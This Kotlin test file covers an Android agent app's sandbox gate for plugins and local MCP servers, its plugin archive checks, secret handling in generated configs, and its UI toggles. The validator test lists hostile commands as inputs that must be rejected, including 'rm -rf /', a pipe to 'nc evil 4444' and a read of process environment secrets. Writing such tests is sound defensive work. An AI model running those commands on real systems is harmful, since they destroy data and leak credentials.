package com.example

import android.content.Context
import androidx.compose.ui.test.assertIsDisplayed
import androidx.compose.ui.test.junit4.createComposeRule
import androidx.compose.ui.test.onAllNodesWithTag
import androidx.compose.ui.test.onNodeWithTag
import androidx.compose.ui.test.onNodeWithText
import androidx.compose.ui.test.performClick
import androidx.room.Room
import androidx.test.core.app.ApplicationProvider
import com.example.agent.opencode.OpenCodeConfigAdapter
import com.example.agent.pi.PiConfigAdapter
import com.example.core.security.ExtensionCredentialVault
import com.example.core.security.TokenCipher
import com.example.data.database.AgtDatabase
import com.example.data.extensions.ExtensionPackageValidator
import com.example.data.extensions.ExtensionRegistryRepository
import com.example.data.extensions.McpHttpClient
import com.example.data.extensions.McpStdioClient
import com.example.data.preferences.AppPreferencesRepository
import com.example.data.runtime.LocalRuntimeExecutor
import com.example.data.runtime.RuntimeInstallerRepository
import com.example.domain.model.AppPreferencesState
import com.example.domain.model.ExtensionCategory
import com.example.domain.model.ExtensionInstallState
import com.example.domain.model.GatewayModelInfo
import com.example.domain.model.GatewayProtocolMode
import com.example.domain.model.McpTransportType
import com.example.feature.extensions.ExtensionsScreen
import com.example.feature.extensions.ExtensionsViewModel
import com.example.ui.theme.AgtTheme
import com.sun.net.httpserver.HttpServer
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.InetSocketAddress
import java.nio.charset.StandardCharsets
import java.security.MessageDigest
import java.util.zip.GZIPOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class SandboxedPluginAndLocalMcpTest {

    @get:Rule
    val composeRule = createComposeRule()

    private lateinit var context: Context
    private lateinit var db: AgtDatabase
    private lateinit var prefs: AppPreferencesRepository
    private lateinit var vault: ExtensionCredentialVault
    private lateinit var runtimeInstaller: RuntimeInstallerRepository
    private lateinit var runtimeExecutor: LocalRuntimeExecutor
    private lateinit var registry: ExtensionRegistryRepository
    private lateinit var server: HttpServer
    private lateinit var baseUrl: String

    private val testCipher = object : TokenCipher {
        override fun encrypt(plaintext: String): ByteArray =
            plaintext.toByteArray(StandardCharsets.UTF_8).map { (it.toInt() xor 0x4A).toByte() }.toByteArray()

        override fun decrypt(payload: ByteArray): String =
            String(payload.map { (it.toInt() xor 0x4A).toByte() }.toByteArray(), StandardCharsets.UTF_8)
    }

    @Before
    fun setUp() {
        context = ApplicationProvider.getApplicationContext()
        context.deleteDatabase("test_phase62_ext.db")
        context.getSharedPreferences("agt_extension_vault", Context.MODE_PRIVATE).edit().clear().commit()
        File(context.filesDir, "extensions").deleteRecursively()
        File(context.filesDir, "runtime").deleteRecursively()

        db = Room.databaseBuilder(context, AgtDatabase::class.java, "test_phase62_ext.db")
            .allowMainThreadQueries()
            .build()
        prefs = AppPreferencesRepository(context)
        runBlocking { prefs.setAllowProotSandboxExtensions(false) }
        vault = ExtensionCredentialVault(context, testCipher)
        runtimeInstaller = RuntimeInstallerRepository(context, prefs)
        runtimeExecutor = LocalRuntimeExecutor(runtimeInstaller)
        registry = ExtensionRegistryRepository(
            context = context,
            extensionDao = db.extensionDao(),
            credentialVault = vault,
            mcpHttpClient = McpHttpClient(),
            runtimeExecutor = runtimeExecutor,
            preferencesRepository = prefs,
        )
        server = HttpServer.create(InetSocketAddress("127.0.0.1", 0), 0)
        server.start()
        baseUrl = "http://127.0.0.1:${server.address.port}"
    }

    @After
    fun tearDown() {
        runBlocking {
            runtimeExecutor.terminateAll()
            prefs.setAllowProotSandboxExtensions(false)
            prefs.setRuntimeManifestUrl("")
        }
        server.stop(0)
        db.close()
        context.deleteDatabase("test_phase62_ext.db")
        context.getSharedPreferences("agt_extension_vault", Context.MODE_PRIVATE).edit().clear().commit()
        File(context.filesDir, "extensions").deleteRecursively()
        File(context.filesDir, "runtime").deleteRecursively()
    }

    @Test
    fun `sandbox opt-in gate blocks plugins and local stdio MCP until enabled`() = runBlocking {
        // Default state must strictly block catalog plugin install, inline plugin import, and local stdio MCP registration
        val catalogBlock = registry.installCatalogExtension("opencode.plugin.command-hooks")
        assertTrue(catalogBlock.isFailure)
        assertEquals(ExtensionRegistryRepository.SANDBOX_GATE_ERROR, catalogBlock.exceptionOrNull()?.message)

        val inlineBlock = registry.importPluginPackage(
            "export default async function () { return {}; }"
        )
        assertTrue(inlineBlock.isFailure)
        assertEquals(ExtensionRegistryRepository.SANDBOX_GATE_ERROR, inlineBlock.exceptionOrNull()?.message)

        val localMcpBlock = registry.registerLocalMcpServer(
            name = "Memory MCP",
            commandLine = "npx -y @modelcontextprotocol/server-memory",
            verifyConnection = false,
        )
        assertTrue(localMcpBlock.isFailure)
        assertEquals(ExtensionRegistryRepository.SANDBOX_GATE_ERROR, localMcpBlock.exceptionOrNull()?.message)

        // Opt-in unlocks both JS/TS plugins and local stdio MCP registration
        prefs.setAllowProotSandboxExtensions(true)

        val inlineOk = registry.importPluginPackage(
            """
                {
                  "id": "custom.test.guard",
                  "name": "Custom Guard",
                  "description": "Tests plugin opt-in.",
                  "entrypoint": "index.ts",
                  "code": "export default async () => ({ hooks: {} });"
                }
            """.trimIndent()
        ).getOrThrow()
        assertEquals(ExtensionCategory.PLUGINS, inlineOk.category)
        assertEquals(ExtensionInstallState.INSTALLED_ENABLED, inlineOk.installState)
        assertEquals("index.ts", inlineOk.pluginEntrypoint)
        assertEquals(1, registry.getEnabledPluginRuntimeConfigs().size)

        val localOk = registry.registerLocalMcpServer(
            name = "Memory MCP",
            commandLine = "npx -y @modelcontextprotocol/server-memory",
            verifyConnection = false,
        ).getOrThrow()
        assertEquals(McpTransportType.LOCAL_STDIO, localOk.mcpTransportType)
        assertEquals(1, registry.getEnabledMcpRuntimeConfigs().size)

        // Turning off sandbox toggle immediately withholds plugins & local stdio MCP configs at runtime
        prefs.setAllowProotSandboxExtensions(false)
        assertTrue(registry.getEnabledPluginRuntimeConfigs().isEmpty())
        assertTrue(registry.getEnabledMcpRuntimeConfigs().isEmpty())
    }

    @Test
    fun `validateLocalMcpCommand enforces executable allowlist and blocks shell injection or vault paths`() {
        val valid = ExtensionPackageValidator.validateLocalMcpCommand(
            "npx -y @modelcontextprotocol/server-filesystem /workspace"
        ).getOrThrow()
        assertEquals(
            listOf("npx", "-y", "@modelcontextprotocol/server-filesystem", "/workspace"),
            valid,
        )

        assertTrue(ExtensionPackageValidator.validateLocalMcpCommand("bash -c id").isFailure)
        assertTrue(ExtensionPackageValidator.validateLocalMcpCommand("npx foo && rm -rf /").isFailure)
        assertTrue(ExtensionPackageValidator.validateLocalMcpCommand("node app.js | nc evil 4444").isFailure)
        assertTrue(ExtensionPackageValidator.validateLocalMcpCommand("python3 -c open('/proc/self/environ')").isFailure)
        assertTrue(ExtensionPackageValidator.validateLocalMcpCommand("cat agt_gateway_vault").isFailure)
    }

    @Test
    fun `local stdio MCP handshake discovers tools in PRoot runtime and emits OpenCode and Pi configs without secret leaks`() = runBlocking {
        installVerifiedStubMcpRuntime()
        prefs.setAllowProotSandboxExtensions(true)

        // Verify JSON-RPC line parser directly handles npm stdout noise before JSON responses
        val parsed = McpStdioClient.parseJsonRpcResponses(
            listOf(
                "npm warn deprecated something",
                """{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","serverInfo":{"name":"proot-mem","version":"2.1.0"}}}""",
                """{"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"read_graph","description":"Read nodes"},{"name":"delete_entities","description":"Delete nodes","annotations":{"destructiveHint":true}}]}}""",
            )
        ).getOrThrow()
        assertEquals("proot-mem", parsed.first.serverName)
        assertEquals(2, parsed.second.size)
        assertFalse(parsed.second[0].isDestructive)
        assertTrue(parsed.second[1].isDestructive)

        val registered = registry.registerLocalMcpServer(
            name = "Local Memory",
            commandLine = "npx -y @modelcontextprotocol/server-memory",
            envToken = "super_secret_local_mcp_tok_999",
            verifyConnection = true,
        ).getOrThrow()

        assertEquals(McpTransportType.LOCAL_STDIO, registered.mcpTransportType)
        assertEquals("2.1.0", registered.version)
        assertEquals(2, registered.discoveredTools.size)
        assertTrue(registered.permissions.contains("MCP_DESTRUCTIVE_APPROVAL"))
        assertTrue(registered.healthMessage.orEmpty().contains("2 tool(s) discovered"))

        val runtimeConfigs = registry.getEnabledMcpRuntimeConfigs()
        assertEquals(1, runtimeConfigs.size)
        assertEquals(McpTransportType.LOCAL_STDIO, runtimeConfigs.single().transportType)

        val ocJson = OpenCodeConfigAdapter.buildOpenCodeConfigJson(
            bridgeBaseUrl = "http://127.0.0.1:41234",
            ephemeralSessionNonce = "nonce-123",
            protocolMode = GatewayProtocolMode.CHAT_COMPLETIONS,
            model = GatewayModelInfo(id = "gpt-5", provider = "openai", supportsStreaming = true, supportsToolCalling = true),
            preferences = AppPreferencesState(allowProotSandboxExtensions = true),
            mcpServers = runtimeConfigs,
            plugins = emptyList(),
        )
        val dumpedOcJson = ocJson.toString()
        assertFalse("Secret must never appear in opencode.json", dumpedOcJson.contains("super_secret_local_mcp_tok_999"))
        val mcpSpec = ocJson.getJSONObject("mcp").getJSONObject(runtimeConfigs.single().alias)
        assertEquals("local", mcpSpec.getString("type"))
        assertEquals("npx", mcpSpec.getJSONArray("command").getString(0))
        assertTrue(mcpSpec.getJSONObject("environment").getString(runtimeConfigs.single().envVarTokenName!!).startsWith("{env:"))

        val piMd = PiConfigAdapter.buildSystemAppendMarkdown(
            activeSkills = emptyList(),
            mcpServers = runtimeConfigs,
            activePlugins = emptyList(),
        )
        assertTrue(piMd.contains("local PRoot stdio (npx -y @modelcontextprotocol/server-memory)"))

        val policy = registry.buildActiveExtensionPolicy()
        assertTrue(policy.destructiveMcpTools.contains("delete_entities"))
    }

    @Test
    fun `JS TS plugin zip and raw ts downloads verify sha256 block native binaries and sync to OpenCode and Pi dirs`() = runBlocking {
        prefs.setAllowProotSandboxExtensions(true)

        val validZip = buildZipArchive(
            mapOf(
                "my-plugin-main/package.json" to """{"name":"opencode-guard","version":"1.2.0","main":"src/index.ts","description":"Confined TS plugin"}""",
                "my-plugin-main/src/index.ts" to "export default async ({ client }) => ({ hooks: {} });\n",
                "my-plugin-main/README.md" to "# OpenCode Guard\n",
            )
        )
        val zipSha = ExtensionPackageValidator.sha256Hex(validZip)
        server.createContext("/guard-plugin.zip") { ex ->
            ex.responseHeaders.add("Content-Type", "application/zip")
            ex.sendResponseHeaders(200, validZip.size.toLong())
            ex.responseBody.use { it.write(validZip) }
        }

        val installedZip = registry.importPluginPackage(
            rawSourceOrContent = "$baseUrl/guard-plugin.zip",
            expectedSha256 = zipSha,
        ).getOrThrow()
        assertEquals(ExtensionCategory.PLUGINS, installedZip.category)
        assertEquals("src/index.ts", installedZip.pluginEntrypoint)
        assertEquals(zipSha, installedZip.sha256)

        // Native binary (.so) inside plugin archive must remain strictly forbidden (Play Integrity zero-DCL rule)
        val nativeZip = buildZipArchive(
            mapOf(
                "evil-plugin/src/index.ts" to "export default () => ({});",
                "evil-plugin/native/libpayload.so" to "ELF_BINARY",
            )
        )
        server.createContext("/native-plugin.zip") { ex ->
            ex.sendResponseHeaders(200, nativeZip.size.toLong())
            ex.responseBody.use { it.write(nativeZip) }
        }
        assertTrue(registry.importPluginPackage("$baseUrl/native-plugin.zip").isFailure)

        // Sync plugins into both OpenCode session plugins dir and Pi extensions dir
        val ocPluginsDir = File(context.filesDir, "extensions/tmp_oc_plugins")
        val piExtensionsDir = File(context.filesDir, "extensions/tmp_pi_extensions")
        assertEquals(1, registry.syncEnabledPluginsToDirectory(ocPluginsDir))
        assertEquals(1, registry.syncEnabledPluginsToDirectory(piExtensionsDir))
        val cfg = registry.getEnabledPluginRuntimeConfigs().single()
        assertTrue(File(ocPluginsDir, "${cfg.slug}/src/index.ts").isFile)
        assertTrue(File(piExtensionsDir, "${cfg.slug}/src/index.ts").isFile)

        val ocJson = OpenCodeConfigAdapter.buildOpenCodeConfigJson(
            bridgeBaseUrl = "http://127.0.0.1:41234",
            ephemeralSessionNonce = "nonce-123",
            protocolMode = GatewayProtocolMode.CHAT_COMPLETIONS,
            model = GatewayModelInfo(id = "gpt-5", provider = "openai", supportsStreaming = true, supportsToolCalling = true),
            preferences = AppPreferencesState(allowProotSandboxExtensions = true),
            plugins = listOf(cfg),
        )
        assertEquals(
            "./plugins/${cfg.slug}/src/index.ts",
            ocJson.getJSONArray("plugin").getString(0),
        )

        val piMd = PiConfigAdapter.buildSystemAppendMarkdown(
            activeSkills = emptyList(),
            mcpServers = emptyList(),
            activePlugins = listOf(cfg),
        )
        assertTrue(piMd.contains("./extensions/${cfg.slug}/src/index.ts"))
    }

    @Test
    fun `ExtensionsScreen flips sandbox opt-in toggle reveals Add Plugin and switches MCP transport mode`() {
        val vm = ExtensionsViewModel(registry, prefs)
        composeRule.setContent {
            AgtTheme {
                ExtensionsScreen(viewModel = vm)
            }
        }
        composeRule.waitForIdle()

        // Navigate to Plugins tab -> locked state shown initially
        composeRule.onNodeWithTag("ext_tab_plugins").performClick()
        composeRule.onNodeWithText("Sandboxed Plugin Host Required").assertIsDisplayed()
        assertEquals(0, composeRule.onAllNodesWithTag("ext_add_plugin_button").fetchSemanticsNodes().size)

        // Toggle Sandboxed PRoot Host opt-in switch
        composeRule.onNodeWithTag("ext_plugins_sandbox_switch").performClick()
        composeRule.waitUntil(3_000) {
            composeRule.onAllNodesWithTag("ext_add_plugin_button").fetchSemanticsNodes().isNotEmpty()
        }
        composeRule.onNodeWithText("Sandboxed PRoot Host Active").assertIsDisplayed()
        assertTrue(runBlocking { prefs.preferences.first().allowProotSandboxExtensions })

        // Switch to MCP Servers tab and toggle Local PRoot stdio transport inside Add MCP dialog
        composeRule.onNodeWithTag("ext_tab_mcp_servers").performClick()
        composeRule.onNodeWithTag("ext_add_mcp_button").performClick()
        composeRule.onNodeWithTag("ext_mcp_transport_stdio").performClick()
        composeRule.onNodeWithTag("ext_mcp_command_input").assertIsDisplayed()
    }

    private suspend fun installVerifiedStubMcpRuntime() {
        val stubNpxScript = """
            #!/bin/sh
            while IFS= read -r line; do
              case "${"$"}line" in
                *'"method":"initialize"'*)
                  echo '{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","serverInfo":{"name":"proot-mem","version":"2.1.0"}}}'
                  ;;
                *'"method":"tools/list"'*)
                  echo '{"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"read_graph","description":"Read nodes"},{"name":"delete_entities","description":"Delete nodes","annotations":{"destructiveHint":true}}]}}'
                  exit 0
                  ;;
              esac
            done
        """.trimIndent().toByteArray(StandardCharsets.UTF_8)

        val tarGzBytes = buildSampleTarGz(
            entries = listOf(
                "rootfs/bin/sh" to "#!/bin/sh\nexec /bin/sh \"\$@\"\n".toByteArray(StandardCharsets.UTF_8),
                "rootfs/usr/bin/npx" to stubNpxScript,
                "rootfs/etc/os-release" to "NAME=Ubuntu\n".toByteArray(StandardCharsets.UTF_8),
            )
        )
        val sha = ExtensionPackageValidator.sha256Hex(tarGzBytes)
        val deviceAbisJson = android.os.Build.SUPPORTED_ABIS.joinToString(",") { "\"$it\"" }

        server.createContext("/p62-manifest.json") { ex ->
            val body = """
                {
                  "runtime_id": "agt-ubuntu-p62",
                  "version": "1.0.0",
                  "release_channel": "stable",
                  "supported_abis": [$deviceAbisJson],
                  "min_android_sdk": 24,
                  "min_required_free_bytes": 1024,
                  "bundle": {
                    "download_url": "$baseUrl/p62-bundle.tar.gz",
                    "compressed_size_bytes": ${tarGzBytes.size},
                    "sha256": "$sha",
                    "archive_format": "tar.gz",
                    "extraction_root": "rootfs",
                    "required_paths": ["bin/sh", "usr/bin/npx"]
                  }
                }
            """.trimIndent().toByteArray(StandardCharsets.UTF_8)
            ex.sendResponseHeaders(200, body.size.toLong())
            ex.responseBody.use { it.write(body) }
        }
        server.createContext("/p62-bundle.tar.gz") { ex ->
            ex.sendResponseHeaders(200, tarGzBytes.size.toLong())
            ex.responseBody.use { it.write(tarGzBytes) }
        }

        val res = runtimeInstaller.installBlocking("$baseUrl/p62-manifest.json")
        assertTrue("Runtime install failed: ${res.exceptionOrNull()?.message}", res.isSuccess)
    }

    private fun buildZipArchive(files: Map<String, String>): ByteArray {
        val out = ByteArrayOutputStream()
        ZipOutputStream(out).use { zos ->
            files.forEach { (path, content) ->
                zos.putNextEntry(ZipEntry(path))
                zos.write(content.toByteArray(StandardCharsets.UTF_8))
                zos.closeEntry()
            }
        }
        return out.toByteArray()
    }

    private fun buildSampleTarGz(entries: List<Pair<String, ByteArray>>): ByteArray {
        val tarOut = ByteArrayOutputStream()
        for ((name, data) in entries) {
            val header = ByteArray(512)
            val nameBytes = name.toByteArray(StandardCharsets.UTF_8)
            System.arraycopy(nameBytes, 0, header, 0, minOf(nameBytes.size, 100))
            "0000755\u0000".toByteArray().copyInto(header, 100)
            "0000000\u0000".toByteArray().copyInto(header, 108)
            "0000000\u0000".toByteArray().copyInto(header, 116)
            String.format("%011o\u0000", data.size).toByteArray().copyInto(header, 124)
            "00000000000\u0000".toByteArray().copyInto(header, 136)
            for (i in 148 until 156) header[i] = ' '.code.toByte()
            header[156] = '0'.code.toByte()
            "ustar\u0000".toByteArray().copyInto(header, 257)
            "00".toByteArray().copyInto(header, 263)
            val sum = header.sumOf { it.toInt() and 0xFF }
            String.format("%06o\u0000 ", sum).toByteArray().copyInto(header, 148)

            tarOut.write(header)
            tarOut.write(data)
            val rem = data.size % 512
            if (rem != 0) tarOut.write(ByteArray(512 - rem))
        }
        tarOut.write(ByteArray(1024))
        val gzOut = ByteArrayOutputStream()
        GZIPOutputStream(gzOut).use { it.write(tarOut.toByteArray()) }
        return gzOut.toByteArray()
    }
}
